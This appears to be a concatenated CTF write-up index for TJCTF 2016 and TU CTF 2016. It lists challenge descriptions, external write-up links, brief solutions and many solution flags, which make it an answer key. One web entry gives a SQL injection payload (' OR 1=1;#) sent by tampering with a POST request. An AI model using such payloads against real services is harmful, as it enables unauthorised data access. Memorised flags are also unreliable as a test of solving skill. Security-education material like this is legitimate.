`tjctf{0n3_byt3_1s_n0t_3n0ugh}`

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/one_time_subtraction_20_pts.html)
# tjctf-2016 : rsa1-60

**Category:** Cryptography**Points:** 60
**Description:** RSA 1

## Write-up

(TODO)
`tjctf{pp6nh3uqjh2a4karaze0kt70yiq22hkpcdzutyoo4aand40l3or73kehrb8n4ft1zh9g7i00lxss83p083dlwxa70brhl6qagx1s6mq8edozln7urps6cbd6kd01g0kvtzbg5e6nhev394777lhs427cpcmi96dc226hrpqwcl6uji1346jh4cfuz3w9i0m25s5ulkilatyjg7nsbi6jka2mocchqf8jxpfypbocqq1fj4cqgdydys0bt7j3h572bgfq6rt3rdgy2q33zyhgqoj3u3il8gchqg1bof6kmt1fpo1ragzxlx6baqt2u7baw0r77c8k2cb92qmto3kgagb45vmooyz9482btindgjuq7tgiwr10iau1icv1hhtll5zrz4oejyk0h26kfbglx25nvu5m1b1d9pn3x9reev55oaaqqoauep3h3bvh011pxgxfm09kbixxurghbw3r4pntdcqha2g287stdy3tev7op}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-RSA1/)
* [My Computer is a Potato](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/rsa_1_60_pts.html)
# tjctf-2016 : rsa2-90

**Category:** Cryptography**Points:** 90
**Description:** RSA 2

## Write-up

(TODO)
`tjctf{7FtNg1Vu7bbAhszil8IBveu3jlxFhxsZDpV5AapNYQqnxz09VAHG4gOodNdj6SGcClq1hyVeRi27bdG2jO9Z50aoN6VbT6Z0UQhtoLwJZvRAHfoU7DVM5PXlbMFZFIbw3lUDe6KnnuhWclr5MrpDEAPDkpeuL3DY5WWcWJMOMY7sRflcK6l9UCFaofZqtyG2zmKZYqox}`

## Other write-ups and resources

* none yet
# tjctf-2016 : znzarmt-mvd-hproo-10

**Category:** Cryptography
**Points:** 10
**Description:** [gqxgu{m0g_z_xz3h4i_x1ks3i}](https://youtu.be/_wCxRn35jwA?t=9)

## Write-up

When clicking on the link, you are redirected to a YouTube video of children singing the alphabet backwards. After some figuring, it appears if you match the forward English alphabet with the English alphabet backwards, each letter will substitute into `tjctf{n0t_a_ca3s4r_c1ph3r}`. The cipher key looks something like this:
```
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Z Y X W V U T S R Q P O N M L K J U H G F E D C B A
```
## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3458)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/znzarmt_mvd_hproo_10_pts.html)
# tjctf-2016 : basic-images-65

**Category:** Forensics**Points:** 65
**Description:** Check out my shades! If you want the flag, I guess you should be basic like me. Good luck!

## Write-up

(TODO)
`tjctf{asc11_c0l0r_inc3pt1on}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-Basic-Images/)
* [Invulnerable - Countersite.org](http://countersite.org/articles/steganography/97-grey-shades-tjctf2016.html)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/basic_images_65_pts.html)
* [irBodyguard - irctf.blog.ir]( http://irctf.blog.ir/1395/03/11/TJCTF-2016-Basic-Images)
# tjctf-2016 : corruption-130

**Category:** Forensics**Points:** 130
**Description:** Have a free flag! It might have gotten corrupted in transmission, but that shouldn't be a problem for you. Right?

## Write-up

(TODO)
`tjctf{c0rruption? wh4t corrupt10n?}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-corruption/)
* [My Computer is a Potato](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/corruption_130_pts.html)
# tjctf-2016 : curses-and-hex-es-65

**Category:** Forensics**Points:** 65
**Description:** Wow! I think I just magicked a flag into this image.

## Write-up

(TODO)
`tjctf{y0u'r3_a_w1z4rd_H4rry!!}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-Curses-and-Hexes/)
* [Invulnerable - Countersite.org](http://countersite.org/articles/steganography/98-curses-and-hexes-stego-tjctf-2016.html)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/curses_and_hex-es_65_pts.html)
# tjctf-2016 : doge1-30

**Category:** Forensics
**Points:** 30
**Description:** My friend's dog was swimming around in the ocean and found a flag, but she refuses to give it to me. Can you get it from here?

## Write-up

Upon close inspection the image contains a dog holding an object with very lightly colored text. Opening the image file in a basic image editor such as Paint.NET, Photoshop, or Gimp and adjusting the contrast, saturation, and/or hue of the image would make the flag appear as `tjctf{th3_f0x_jump3d_0v3r_m3}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3454)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/doge_1_30_pts.html)
# tjctf-2016 : doge2-35

**Category:** Forensics**Points:** 35
**Description:** Do the red colors look a little bit odd in this picture to you?

## Write-up

Because the question points to the red bits, any experienced CTF'er knows this is a reference to least significant bit (LSB) steganography. LSB steganography operates by taking the end of RGB values (only red this time), representing them in binary form (0 - 255), then changing the last bit to either a 0 or a 1 so that when one collects a the ends of all the red bytes, it will reveal either a text flag, or the contents of an image that displays the flag. In this case, running the image through [a trusty online steganography detector](http://incoherency.co.uk/image-steganography/#unhide), will present to you an image with the following flag: `tjctf{0dd5_4nd_3v3n5}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3453)
* [My Computer is a Potato -gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/doge_2_35_pts.html)
# tjctf-2016 : may-1-2600-100

**Category:** Forensics**Points:** 100
**Description:** Sometimes I miss that land of bliss.

## Write-up

After downloading and unzipping the file provided, it appears as a .DBX file. Googling 'dbx file' indicates the file at hand is a saved message from Microsoft Outlook. Download a free, simple DBX file viewer, then open the DBX file. Reading  the message, it refers to an attached file of a computer backup. Most free DBX viewers won't let you download the attachment easily, so you may have to find the raw attachment of the .BKF file in base 64 form. Then download a base64 to bkf file tool. Compile the base 64 attachment into the BKF file format. Google search for a BKF file viewer and download it. Then walk through the file system of the BKF file until you find the flag.doc file (there are two, only one has a flag) and find your way into the file, where you will find the following flag: `tjctf{@_b1@sT_Fr0M_tH3_Pa$t}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3451)
* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-May-1-2600/)
* [The_Invulnerable - coutersite.org](http://countersite.org/articles/sysadmin/99-outbox-forensics-tjctf-2016.html)
 * [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/may_1st,_2060_100_pts.html)
# tjctf-2016 : mu-sic-200

**Category:** Forensics**Points:** 200
**Description:** [mu's Music Start!](https://drive.google.com/open?id=0B2D8bCaecZXTelczOGVqMVhiWVE)

## Write-up

(TODO)
`tjctf{g91s4p7y0mzf4p0ufkxfvyopdiekgx21a5fcxhv5p9uj8fqu0c2}`

## Other write-ups and resources

* http://sibears.ru/labs/TJCTF-CTF-2016-music/
# tjctf-2016 : roverctl-50

**Category:** Misc**Points:** 50
**Description:** Looks like the backdoor you installed on Pathfinder is working; you've captured these packets. But what do they all mean? maybe this pdf will help

## Write-up

(TODO)
 `tjctf{i_lik3_potat03s}`

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/roverctl_100_pts.html)
# tjctf-2016 : torrent-90

**Category:** Forensics**Points:** 90
**Description:** Help, someone's sharing flags.

## Write-up

(TODO)
`tjctf{pls_2_n0t_fl4g_share}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-torrent/)
* [b0tch_sec - b0tchsec.com](http://b0tchsec.com/2016/05/ctf-writeup-tjctf-torrent)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/torrent_90_pts.html)
# tjctf-2016 : contingency-120

**Category:** Misc
**Points:** 120
**Description:** Control wants some information from the irrelevant list, but you're locked out. Can you figure out Research's secret encoding scheme? `nc p.tjctf.org 8002`

## Write-up

(TODO)
`tjctf{w3lc0m3_to_th3_m4ch1n3}`

## Other write-ups and resources

* none yet
# tjctf-2016 : earphones-155

**Category:** Misc**Points:** 155
**Description:** and a chorus of cicadas

## Write-up

(TODO)
`tjctf{wzodvbycglrhmzxnmtojiozuhxcititgjranratsqaeklmqqxjmmeuqodiqmabamkivukegnypyxqajezykojonqdviyhivnbijs}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-earphones/)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/earphones_155_pts.html)
# tjctf-2016 : flag-seeker-90

**Category:** Misc
**Points:** 90
**Description:** FlagSeeker has detected a flag. Unfortunately, there's some noise that it hasn't managed to filter out. Can you help ~Samaritan~ the New York CTF Department find the flag?

## Write-up

(TODO)
`tjctf{f1agse3k3r_h4s_0_fa1se_positives}`

## Other write-ups and resources

* none yet
# tjctf-2016 : gravity-mud-90

**Category:** Misc**Points:** 90
**Description:** Wanna hear a joke? north, south, east, west, up, down, examine item `nc p.tjctf.org 8006`

## Write-up

After connecting to the given server on netcat, it is painstakingly obvious this text adventure is similar to Zork (an online text-adventure game). One strategy may be to copy and paste  directions (seperated by a newline) into the netcat connection quickly until you find the flag. I found it easier to write [a Java program](https://gist.github.com/tjgerot/0c49de3d891107186255fc95a9e1d38e) that takes in a series of directions, connects to the server, and executes all the commands in rapid succession. After touring the map, I came across pieces of the flag until you put it together and submit this flag: `tjctf{y0u_m1ght_h@v3_b33n_m1$sing_t3h_fl4g_but_YOUR_A1M_IS_G3TT1NG_B3TT3R}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3449)
* [HackCat](http://s0ngsari.tistory.com/entry/TJCTF-gravitymud)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/gravitymud_90_pts.html)
# tjctf-2016 : interesting-telegrams-100

**Category:** Misc**Points:** 100
**Description:** We intercepted this message from the Fully Centralized Public Services' Department of Interesting Telegrams. We have reason to believe that the message contains secret information, but our top Morse decoders can't seem to get it.

## Write-up

(TODO)
`tjctf{m3ss4ge_s3cur1ty_1$_h@rd}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-Interesting-Telegrams/)
# tjctf-2016 : r-u-insane-5

**Category:** Misc**Points:** 5
**Description:** Copy and paste the flag into the box below. Use this flag format for all problems unless specified otherwise. "tjctf{y4y_u_R_5aN3}"

## Write-up

This challenge was meant to be introductory, low value, and was intended to inform you of the tjctf{flag} format. All you must do is copy the flag `tjctf{y4y_u_R_5aN3}` and paste it into the submission box (as instructed).

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3456)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/r_u_insane_5_pts.html)
# tjctf-2016 : time-travel-90

**Category:** Misc
**Points:** 90
**Description:** I tried setting up Google Apps for TJCTF a while ago, but it wasn't working. Don't worry, I'm pretty sure it's fixed now. Hint: What do timetables, metallurgy, and metaphors all have in common?

## Write-up

(TODO)
`tjctf{w1sh_i_c0uld_turn_b4ck_t1m3}`

## Other write-ups and resources

* none yet
# tjctf-2016 : a-hundred-captchas-60

**Category:** Misc**Points:** 60
**Description:** I heard that this server will give you a flag if you solve a few captchas for them. `nc p.tjctf.org 8008`

## Write-up

Using netcat (or the socket equivalent), go to p.tjctf.org on port 8008 (no longer running) and you can solve a few captchas at a time, unfortunately they require you answer 100 captchas in 30 seconds or less, which indicates you need to automate the process with a script. Although there are many different approaches to solving this problem, the easiest may be to divide the character output of the server into a two dimensional array, split the captcha up into characters, recognize each character (the ASCII drawing font can be found online), and send back the characters of the decoded captcha. After successfully completing 100 in before the server reaches 30 seconds, you will be provided with the flag:  `tjctf{p30PL3_4c7u4llY_D0_7H15}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3452)
* [My Computer is a Potato](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/a_hundred_captchas_60_points.html)
# tjctf-2016 : guess-120

**Category:** PPC
**Points:** 120
**Description:** Can you guess the numbers? `nc p.tjctf.org 8007`

## Write-up

(TODO)
`tjctf{n0t_so_r4ndom_4nymor3}`

## Other write-ups and resources

* http://sibears.ru/labs/TJCTF_GUESS/
# tjctf-2016 : blag-175

**Category:** Binary**Points:** 175
**Description:** Check out my new blog platform! `nc p.tjctf.org 8017`

## Write-up

(TODO)
`tjctf{I_h3aRd_ab0u7_1t_oN_th3_1nterBlag!}`

## Other write-ups and resources

* [0x90r00t - 090root.com](https://0x90r00t.com/2016/05/31/tjctf-2016-exploit-175-blag-write-up/)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/Binaries%20R%20done/blag_180_pts.html)
# tjctf-2016 : httc-165

**Category:** Binary**Points:** 165
**Description:** I made a web server. Using C. What could go wrong? Flag's at `../flag.txt`. http://p.tjctf.org:8013/ Oh, you want the source? fiiiine...

## Write-up

(TODO)
`tjctf{tfw_n0_st@ck_pr0t3ct1on_lma0}`

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/Binaries%20R%20done/httc_190_pts.html)
# tjctf-2016 : oneshot-170

**Category:** Binary**Points:** 170
**Description:** One plus one is done. `nc p.tjctf.org 8015`

## Write-up

(TODO)
`tjctf{m4gic_And_m0re_Mag1cK}`

## Other write-ups and resources

* [0x09r00t - 0x09r00t.com](https://0x90r00t.com/2016/05/31/tjctf-2016-exploit-170-oneshot-write-up/)
* [ChocolateMakers - GitHub.com](https://github.com/r00ta/myWriteUps/blob/master/TJCTF/pwnable170/exploit.py)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/Binaries%20R%20done/oneshot_170_pts.html)
# TJCTF 2016 write-ups

* Scoreboard not released

## Repo-local write-ups

* none

## External write-ups only

* [reversing/what-am-i-to-you-90](reversing/what-am-i-to-you-90)
* [reversing/reversing-20](reversing/reversing-20)
* [pwn/blag-175](pwn/blag-175)
* [pwn/oneshot-170](pwn/oneshot-170)
* [pwn/httc-165](pwn/httc-165)
* [ppc/guess-120](ppc/guess-120)
* [ppc/a-hundred-captchas-60](ppc/a-hundred-captchas-60)
* [misc/r-u-insane-5](misc/r-u-insane-5)
* [misc/interesting-telegrams-100](misc/interesting-telegrams-100)
* [misc/earphones-155](misc/earphones-155)
* [misc/gravity-mud-90](misc/gravity-mud-90)
* [crypto/financial-transaction-60](crypto/financial-transaction-60)
* [crypto/rsa2-90](crypto/rsa2-90)
* [crypto/cipher-font-50](crypto/cipher-font-50)
* [crypto/rsa1-60](crypto/rsa1-60)
* [crypto/curvature-200](crypto/curvature-200)
* [crypto/one-time-subtraction-20](crypto/one-time-subtraction-20)
* [forensics/corruption-130](forensics/corruption-130)
* [forensics/may-1-2600-100](forensics/may-1-2600-100)
* [forensics/basic-images-65](forensics/basic-images-65)
* [forensics/curses-and-hex-es-65](forensics/curses-and-hex-es-65)
* [forensics/mu-sic-200](forensics/mu-sic-200)
* [forensics/torrent-90](forensics/torrent-90)
* [forensics/doge2-35](forensics/doge2-35)
* [forensics/doge1-30](forensics/doge1-30)
* [forensics/roverctl-100](forensics/roverctl-100)
* [web/java-sandbox-100](web/java-sandbox-100)
* [web/use-the-force-80](web/use-the-force-80)
* [web/super-questionable-luggage-service-30](web/super-questionable-luggage-service-30)
* [web/sketchy-airlines-100](web/sketchy-airlines-100)


## Missing write-ups

* [misc/contingency-120](misc/contingency-120)
* [misc/flag-seeker-90](misc/flag-seeker-90)
* [misc/time-travel-90](misc/time-travel-90)
* [crypto/znzarmt-mvd-hproo-10](crypto/znzarmt-mvd-hproo-10)
* [web/luvmarkdown-200](web/luvmarkdown-200)
# tjctf-2016 : reversing-20

**Category:** Binary**Points:** 20
**Description:** Reversing can be very easy

## Write-up

Reversing usually indicates the challenge involves reverse engineering a compiled file (commonly and ELF file). By opening the downloaded file in a basic text editor (notepad, vim, nano, leafpad, etc.) the header indicates it is an ELF file. Google will tell you ELF files are native to Linux (there are no legitimate ELF emulators for other operating systems). I booted Oracle VirtualBox (VMware works too) in Kali Linux and uploaded the ELF file (as reversing.elf). Then simply run `Strings reversing.elf`and it will print out the contents of the ELF file. Scroll through and eventually you will find this string in reverse: `tjctf{literally_reversing}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3455)
# tjctf-2016 : what-am-i-to-you-90

**Category:** Binary**Points:** 90
**Description:** Finn wrote a password generator but forgot how it worked. Can you help him out? There are many passwords that can be generated, but only one is correct. You may need to do some recon to find the correct one.

## Write-up

(TODO)
`tjctf{phbgjd}`

## Other write-ups and resources

* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-whatamitoyou/)
# tjctf-2016 : java-sandbox-100

**Category:** Web**Points:** 100
**Description:** Everyone's heard of python jail escapes, but what about Java?

## Write-up

(TODO)
`tjctf{j4V4_R3FL3C710n_15_7R1CkY}`

## Other write-ups and resources

* [HackCat](http://s0ngsari.tistory.com/entry/TJCTF-Java-sandbox)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/java_sandbox_100_pts.html)
# ~ luvmarkdown ~

## Distribution
Unfortunately, the setup of this problem is rather fragile.

The web server uses Node.js, and the Node dependencies can be installed from
`web/package.json`.

The server also requires PhantomJS to be installed. *In particular, `app.js`
expects to be able to run `phantomjs` from a shell.* This may pose problems,
especially on Windows. On my Windows machine, I've done this by creating a
symlink `web/phantomjs.exe` that points to a real copy of PhantomJS.

Next, `setup.js` needs to be run to initialize the problem. This script will
copy the files in `initial_files` into `web/uploads`; in particular, the
description file and the flag file.

Note that `fetch.js` is also dependent on the current host, which as of now
is set to `http://localhost:3000`. This will obviously change.

## Other notes
Note that because this setup relies on hashes, it is sensitive to even the
smallest changes in either of the `initial_files`:

  * If `flag.txt` is changed, the corresponding hash in `fetch.js` must also
    be changed.
  * If `description.txt` is changed, the corresponding hash in `problem.yml`
    must also be changed.

## Improvements
Currently, files are stored in `web/uploads`, and the session data from
`express-session` is stored in memory. This is quite suboptimal. Eventually,
those should both be stored in a database, if/when possible.
# tjctf-2016 : luvmarkdown-200

**Category:** Web**Points:** 200
**Description:** You can tell that the guy that runs this service is kind of weird, what with
  the Markdown obsession and all. But here's a secret: he also has a super
  special flag that he doesn't want anyone else to see. Find out more at
  676a7a9b3ef0d163df6f6f9444e8482e95e0c2c3169733905035a4e6583b5997.
  Can you recover the flag?

## Write-up

(TODO)
`tjctf{ce905b7859b9745e249aac6566d293be}`

## Other write-ups and resources

* none
# tjctf-2016 : sketch-airlines-100

**Category:** Web**Points:** 100
**Description:** We found this picture of a plane ticket online. Can you get the redacted information?

## Write-up

(TODO)
`tjctf{h1d3_y0UR_84RC0d3s}`

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/sketchy_airlines_100_pts.html)
# tjctf-2016 : super-questionable-luggage-service-30

**Category:** Web**Points:** 30
**Description:** I was using this great luggage storing service, but I accidentally stored my flag with them. Fortunately, my flag went in the wrong way, so it shouldn't be difficult for you to find. Right? [super-questionable-luggage.p.tjctf.org](http://super-questionable-luggage.p.tjctf.org)

## Write-up

This challenge takes some messing around, but if you monitor the data sent from the front end to the back end, you will soon realize they left a major hiccup in their security. All front end infrastructure and all data that hasn't reached the server can be altered. Normally web services will accept the exact text their user enters and sanitize (change to a safe format) characters used in SQL injections such as ';# on the server side. However, this service sanitizes the input, then sends it to the back end where it is immediately executed in an SQL statement. Since we can edit data after the form sends it and before the server receives it, we can put back in the infamous SQL injection using BurpSuite through Kali Linux, or through a simple POST request client. If you have change the data in the POST request to say `' OR 1=1;#` then the SQL server will execute that and return all the luggage entries in the database. While reading through the long list of luggage identifiers, you should see the following flag: `tjctf{th1s_m4d3_1t_e4s1er}`

## Other write-ups and resources

* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3457)
* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/super_questionable_luggage_service_30_pts.html)
# tjctf-2016 : use-the-force-80

**Category:** Web**Points:** 80
**Description:** Find the flag. [http://usetheforce.p.tjctf.org](http://usetheforce.p.tjctf.org/)

## Write-up

(TODO)
`tjctf{99f47fbbc74e814a9a00a6458d4e5c12}`

## Other write-ups and resources

* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/use_the_force_80_pts.html)
# TU CTF : hash-n-bake-200

**Category:** Crypto
**Points:**  200
**Solves:** 
**Description:**
A random goat from Boston hashed our password! Can you find the full output?

Note, flag is what would have printed. I.e. TUCTF{0xadeadbeef1dea}



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/crypto/hashnbake
* http://countersite.org/93-hash-n-bake.html
# TU CTF : image-magic-50

**Category:** Crypto
**Points:** 50
**Solves:** 
**Description:**
An encrypted PNG and the python script used to encrypt it are given


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TU CTF : magic-image-100

**Category:** Crypto
**Points:** 100
**Solves:** 
**Description:**
Magic Image
100

We found this png, but it seems to be encrypted...

Can you decrypt it?


## Write-up

(TODO)

## Other write-ups and resources
* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/Magic%20Image
* http://countersite.org/articles/cryptography/90-magic-image.html
* https://github.com/Fire30/CTF-WRITEUPS/blob/master/TUCTF/crypto/magic-image.md
* http://sibears.ru/labs/tuctf-2016-magic-image/
# TU CTF : secure-auth-150

**Category:** Crypto
**Points:** 150
**Solves:** 
**Description:**
We have set up this fancy automatic signing server!

We also uses RSA authentication, so it’s super secure!


nc 104.196.116.248 54321


## Write-up

(TODO)

## Other write-ups and resources

* http://duksctf.github.io/TUCTF-Secure-Auth/
# TU CTF : secure-transmission-150

**Category:** Crypto
**Points:** 150
**Solves:** 
**Description:**
We were able to recover this network traffic from some shady giraffes... Can you tell what they were saying?

note this flag is in the form: flag{...}


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/crypto/securetransmission
* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/Secure%20transmission
# TU CTF : the-neverending-crypto-500

**Category:** Crypto
**Points:** 500
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://blog.nfrost.me/2016/05/15/tu-ctf-2016-neverending-crypto.html
* http://sibears.ru/labs/tuctf-2016-the-neverending-crypto/
* https://uss.informatik.uni-ulm.de/?p=429
# TU CTF : beatz-for-dayz-100

**Category:** Misc
**Points:** 100
**Solves:** 
**Description:**
Flagg hidden in a FLAC file


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/Beatz%20for%20dayz
* http://sibears.ru/labs/TUCTF-2016-Beatz-for-dayz/
# TU CTF : small-horse-50

**Category:** Misc
**Points:** 50
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://sibears.ru/labs/tuctf-2016-small-horse/
# TU CTF : start-your-descent-50

**Category:** Misc
**Points:** 50
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://uss.informatik.uni-ulm.de/?p=429
# TU CTF : the-nack-100

**Category:** Misc
**Points:** 100
**Solves:** 
**Description:**
Attached file (PCAP)


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/The%20Nack
* http://sibears.ru/labs/TUCTF-2016-The-Nack/
* http://b0tchsec.com/2016/tuctf/the-nack
* https://uss.informatik.uni-ulm.de/?p=429
* http://www.codilime.com/tuctf16-the-nack/
# TU CTF : bbys-first-elf-25

**Category:** Pwn
**Points:** 25
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://uss.informatik.uni-ulm.de/?p=429
# TU CTF : especiallygoodjmps-75

**Category:** Pwn
**Points:** 75
**Solves:** 
**Description:**
Pop a shell.

Binary is hosted at: 130.211.202.98:7575

EDIT:

ASLR is enabled on remote server.


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/pwn/especiallygoodjmps
* https://github.com/r00ta/myWriteUps/blob/master/TUCTF/pwn75/README.md
* https://github.com/ByteBandits/writeups/tree/master/tu-ctf-2016/pwn/especiallygoodjmps/sudhackar
* https://losfuzzys.github.io/writeup/2016/05/16/tuctf2016-especially-good-jumps/
* https://uss.informatik.uni-ulm.de/?p=429
# TU CTF : senior-project-ftw-500

**Category:** Pwn
**Points:** 500
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TU CTF : woO-50

**Category:** Pwn
**Points:** 50
**Solves:** 
**Description:**
My friend let me play this sick game. Can you get the hidden flag?

Challenge hosted at: 104.196.15.126:15050


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/r00ta/myWriteUps/blob/master/TUCTF/WoO/exploit.py
* https://losfuzzys.github.io/writeup/2016/05/16/tuctf2016-WoO/
# TU CTF : woO2-150

**Category:** Pwn
**Points:** 150
**Solves:** 
**Description:**
My friend said he fixed a problem in the last version, can you pwn this one too??

Unintended easy solution for this one, check out new version

Challenge is hosted at: 104.155.227.252:25050


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/r00ta/myWriteUps/blob/master/TUCTF/WoO2/exploit.py
* https://uss.informatik.uni-ulm.de/?p=429
* https://losfuzzys.github.io/writeup/2016/05/16/tuctf2016-WoO/
# TU CTF : woO2-fixed-250

**Category:** Pwn
**Points:** 250
**Solves:** 
**Description:**
My friend said he #Really# fixed a problem in the last version, can you pwn this one too??

(This is the the fixed version)

Challenge is hosted at: 104.155.227.252:31337


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/r00ta/myWriteUps/blob/master/TUCTF/woO2-fixed/exploit.py
* https://github.com/Fire30/CTF-WRITEUPS/blob/master/TUCTF/pwn/woO2.md
* https://losfuzzys.github.io/writeup/2016/05/16/tuctf2016-WoO/
# TU CTF write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [reversing/reverse-for-the-holy-grail-350](reversing/reverse-for-the-holy-grail-350)
* [reversing/re-for-50-plz-50](reversing/re-for-50-plz-50)
* [pwn/bbys-first-elf-25](pwn/bbys-first-elf-25)
* [pwn/woO-50](pwn/woO-50)
* [pwn/especiallygoodjmps-75](pwn/especiallygoodjmps-75)
* [pwn/woO2-150](pwn/woO2-150)
* [pwn/woO2-fixed-250](pwn/woO2-fixed-250)
* [misc/start-your-descent-50](misc/start-your-descent-50)
* [misc/the-nack-100](misc/the-nack-100)
* [misc/beatz-for-dayz-100](misc/beatz-for-dayz-100)
* [misc/small-horse-50](misc/small-horse-50)
* [crypto/the-neverending-crypto-500](crypto/the-neverending-crypto-500)
* [crypto/secure-auth-150](crypto/secure-auth-150)
* [crypto/secure-transmission-150](crypto/secure-transmission-150)
* [crypto/magic-image-100](crypto/magic-image-100)
* [crypto/hash-n-bake-200](crypto/hash-n-bake-200)
* [web/lucky-charms-150](web/lucky-charms-150)
* [web/duckprint-100](web/duckprint-100)
* [web/student-grades-50](web/student-grades-50)
* [web/petpaddinginc-150](web/petpaddinginc-150)

## Missing write-ups

* [reversing/the-game-500](reversing/the-game-500)
* [pwn/senior-project-ftw-500](pwn/senior-project-ftw-500)
* [crypto/image-magic-50](crypto/image-magic-50)
# TU CTF : re-for-50-plz-50

**Category:** Reversing
**Points:** 50
**Solves:** 
**Description:**
A MIPS 64 bit executable is given 50 points


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/RE%20for%2050%20plz
* https://youtu.be/TeIYTPaKlFE
# TU CTF : reverse-for-the-holy-grail-350

**Category:** Reversing
**Points:** 350
**Solves:** 
**Description:**
A 64Bit ELF file is given for 350 points


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/B4rC0/Writeups/tree/master/tuctf-asciioverflow/ReverseForTheHolyGrail
* http://countersite.org/articles/reverse_engineering/92-revers-elfa-c-tu-ctf-2016.html
* https://youtu.be/qDnwIjZ7_aw
# TU CTF : the-game-500

**Category:** Reversing
**Points:** 500
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TU CTF : duckprint-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**
See if you can steal the admin's duck print and validate it!

When calculating the SHA, leave the periods in

http://130.211.242.26:31337


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/DuckPrint
* https://github.com/bl4de/ctf/tree/master/2016/TUCTF_2016/Duck_Print_Web100
* https://uss.informatik.uni-ulm.de/?p=429
# TU CTF : lucky-charms-150

**Category:** Web
**Points:** 150
**Solves:** 
**Description:**
Nothing like cereal and coffee to start your day!

http://146.148.10.175:1033/LuckyCharms


## Write-up

(TODO)

